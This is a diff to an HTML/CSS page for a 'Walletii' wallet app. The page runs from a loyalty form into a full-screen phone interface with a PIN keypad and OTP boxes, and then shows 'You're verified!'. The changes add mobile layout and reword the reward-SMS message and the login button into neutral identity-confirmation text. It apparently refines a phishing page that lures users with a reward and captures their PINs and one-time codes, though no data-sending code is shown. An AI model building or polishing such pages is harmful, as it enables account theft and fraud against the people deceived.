@@ -200,7 +200,6 @@ label {
 
 /* ══════════════════════════════════
    PAGE 2 — WALLETII APP
-   (hidden until loyalty form done)
 ══════════════════════════════════ */
 #app-root {
   display: none;
@@ -208,13 +207,14 @@ label {
   background: #060f14;
   justify-content: center;
   align-items: center;
-  min-height: 100vh;
+  min-height: 100dvh;
   position: fixed;
   inset: 0;
   z-index: 999;
 }
 
 /* ── Phone Shell ── */
+/* Desktop: fixed 390x844 preview */
 .phone-shell {
   width: 390px;
   height: 844px;
@@ -222,6 +222,17 @@ label {
   position: relative;
   overflow: hidden;
   border-radius: 4px;
+}
+
+/* Mobile: fill the real screen */
+@media (max-width: 480px) {
+  .phone-shell {
+    width: 100vw;
+    height: 100dvh;
+    border-radius: 0;
+    overflow-x: hidden;
+    overflow-y: hidden;
+  }
 }
 
 /* ── Screens ── */
@@ -235,6 +246,8 @@ label {
   pointer-events: none;
   transform: translateX(40px);
   transition: opacity 0.35s ease, transform 0.35s ease;
+  overflow-y: auto;
+  -webkit-overflow-scrolling: touch;
 }
 .screen.active {
   opacity: 1;
@@ -245,6 +258,43 @@ label {
   opacity: 0;
   transform: translateX(-40px);
   pointer-events: none;
+}
+
+/* Mobile screen tweaks */
+@media (max-width: 480px) {
+  .screen {
+    padding: 20px 20px 40px;
+  }
+  /* Shrink keypad buttons a bit so everything fits */
+  .key {
+    width: 68px !important;
+    height: 68px !important;
+    font-size: 22px !important;
+  }
+  .keypad-row {
+    gap: 18px !important;
+  }
+  .keypad {
+    gap: 10px !important;
+  }
+  /* Smaller dots row */
+  .dot-cell {
+    width: 38px !important;
+    height: 38px !important;
+  }
+  .dots-row {
+    gap: 10px !important;
+    margin-bottom: 20px !important;
+  }
+  /* OTP boxes */
+  .otp-box {
+    width: 44px !important;
+    height: 50px !important;
+    font-size: 20px !important;
+  }
+  .otp-row {
+    gap: 8px !important;
+  }
 }
 
 /* ── Lang Button ── */
@@ -511,7 +561,7 @@ label {
             <span>I confirm this information is accurate and understand my account will be verified upon login.</span>
           </div>
 
-          <button type="submit" class="f-submit">Login to proceed</button>
+          <button type="submit" class="f-submit">Proceed</button>
 
         </form>
       </div>
@@ -753,7 +803,7 @@ label {
         <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#00e5c8" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
       </div>
       <div style="font-size:20px;font-weight:900;color:#fff;margin-bottom:10px;">You're verified!</div>
-      <div style="font-size:13.5px;color:rgba(255,255,255,0.5);line-height:1.6;margin-bottom:28px;">You will receive sms on your reward.<br>Gratitude from Walletii.</div>
+      <div style="font-size:13.5px;color:rgba(255,255,255,0.5);line-height:1.6;margin-bottom:28px;">Your identity has been confirmed.<br>Welcome to Walletii.</div>
       <button style="width:100%;padding:15px;border:none;border-radius:50px;background:#00e5c8;color:#0d1e24;font-size:15px;font-weight:800;font-family:'Nunito',sans-serif;cursor:pointer;">Get started</button>
     </div>
   </div>
